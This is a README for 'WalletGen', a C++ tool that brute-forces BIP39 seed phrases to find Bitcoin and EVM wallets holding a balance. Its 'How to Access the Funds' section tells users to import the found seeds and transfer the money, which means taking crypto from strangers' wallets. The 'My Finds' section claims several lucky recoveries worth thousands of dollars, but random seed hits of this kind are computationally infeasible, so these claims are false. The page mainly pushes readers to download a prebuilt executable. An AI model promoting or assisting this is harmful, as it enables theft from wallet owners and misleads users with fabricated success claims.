# Seed Searcher Crypto: Find Your Lost Seed Phrase with WalletGen

**Lost your crypto seed phrase?** WalletGen is a powerful and open-source **seed searcher crypto** tool designed to find and help you recover access to your **Bitcoin (BTC)**, **Ethereum (ETH)**, **BNB**, **Polygon (MATIC)**, and other **EVM-compatible wallets**. It is a fast, efficient **seed phrase brute force tool**, utilizing a high-performance C++ engine.

<!--
Meta description:
Use WalletGen as your seed searcher crypto tool. Recover lost Bitcoin, Ethereum, and EVM-compatible wallets. Brute-force seed recovery, wallet generation, balance checks. Get your crypto back now!
-->

## Quick Navigation
- [How It Works: Understanding Seed Phrase Recovery with WalletGen](#how-it-works)
- [Why Choose WalletGen for Seed Phrase Searches?](#why-walletgen)
- [Features: Key Advantages for Your Crypto Recovery](#features)
- [Download WalletGen: Start Your Search Today](#how-to-start)
- [Optimize Your Search: Database Download for Faster Results](#download-and-use-database-for-more-speed)
- [Wallet Found: What To Do Next](#the-program-found-a-wallet--whats-next)
- [Bitcoin Recovery: Step-by-Step Guide](#recovery-your-bitcoin-wallet)
- [My Finds: Success Stories and Recovered Wallets](#my-finds)
- [FAQ: Seed Phrase Search - Your Questions Answered](#-frequently-asked-questions-faq)
- [Build Instructions: Project Compilation Guide](#building-the-project)
- [Support the Project: Donate](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="seed searcher crypto" title="Seed Searcher Crypto" height="460" src="/build/matrix.webp" />
</p>

⚠️ **Disclaimer**:  WalletGen is a research and educational tool and must not be used for unauthorized access or malicious activities. Please use this tool responsibly and only on wallets that you own or have explicit permission to access.

## How It Works

WalletGen uses [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin, and the [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing algorithm for EVM-based blockchains like Ethereum.

The core function is to compare generated addresses against a database or check them in real-time with blockchain explorers. WalletGen, built with C++, offers significantly higher speeds compared to similar tools. The performance is primarily determined by the capabilities of your CPU and GPU.

## Why Choose WalletGen for Seed Phrase Searching?

Why use a slow search? **WalletGen** is built for speed! Written in C++ and optimized for CPU and GPU, it delivers up to **10x faster** performance. If you are trying to find a lost seed phrase, explore existing wallets, or reclaim your crypto, WalletGen offers the best approach.

## Features

-   **Cryptocurrency Wallet Generation**: Generate wallets for Bitcoin, Ethereum, BNB, MATIC, and others.
-   **Brute-Force Seed Searching**: Use brute-force techniques to search for existing wallets.
-   **Algorithm Support**: Keccak256 for EVM and BIP39, BIP44, and Bech32 for Bitcoin.
-   **Database Integration**: Download databases to improve search speeds.
-   **High-Speed Operation**: Harness the power of your CPU and GPU.
-   **Bitcoin Seed Phrase Recovery**: Also includes tools for recovering Bitcoin wallets.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Windows Demo" title="WalletGen search lost bitcoin wallets on Windows" src="/build/paste.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Linux Demo" title="WalletGen search lost bitcoin wallets on Linux" src="/build/help.webp" />
</p>

# How to start

## Windows
-   Download [Release](../../releases)
-   Unpack anywhere
-   Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget
or download [Release for Linux](../../releases)




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** allows you to check wallet balances by using brute-force methods.

### Bitcoin (BTC) Wallet Search:

*   Press key `3` or run `start_search_btc.bat` to search Bitcoin wallets using the internet. This can be slower due to real-time checks.
*   Press key `6` for a faster method - searching using the database.

### EVM Wallet Search (Ethereum, BNB, MATIC, etc.):

*   Press key `5` or run `start_search_evm.bat` to search online.
*   Press key `6` to use the database for speed.

### Speed Considerations:

*   Your hardware, especially the GPU, heavily impacts speed.

Databases greatly improve search efficiency.

## The Program Found a Wallet — What’s Next?

If WalletGen finds a wallet with a balance:
*   The search will **Stop** immediately.
*   The wallet details are **Displayed** in the console.
*   Data is **Saved** in the `found_wallets.txt` file.

### How to Access the Funds?

1.  Import the **mnemonic seed phrase** into any compatible crypto wallet (Metamask, Trust Wallet, Electrum, etc.).
2.  You can transfer the funds to a wallet you control.

>  If a wallet is found, consider donating!

## Recovery Your Bitcoin Wallet

WalletGen can recover Bitcoin wallets using the seed phrase, whether complete or incomplete.

### Process Description

#### Search for Missing Words:

Use * for missing words. WalletGen checks combinations.

#### Entering a Complete Seed Phrase:

Enter the full 12-word seed. WalletGen generates and checks addresses.

![recovery](/build/check.webp)

### Important Recommendations

*   Seed phrases must be 12 words.
*   Use * only for missing words.
*   Searching for missing words takes time.
*   Upon recovery, data is saved.

## My Finds

![mywallet](/build/sharp.webp)

I've recovered two BTC wallets. The first had 0.000032 BTC; the second, 0.0528 BTC (about $4800).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/build/aspect.webp" />
</p>

### New Find 4/9/2025

After a week of searching, I found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my biggest find!

![image](/build/instance.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/build/data.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or a compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
Download WalletGen on the [release download page](../../releases).

### ❓ Where can I download a database of known addresses?
Find the current database on the [release page](../../releases).

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes, WalletGen can help recover lost Bitcoin wallets using brute-force seed generation and a known-address database.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

Consider donating a portion of the recovered balance as a thank you.

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)

Update: link is back online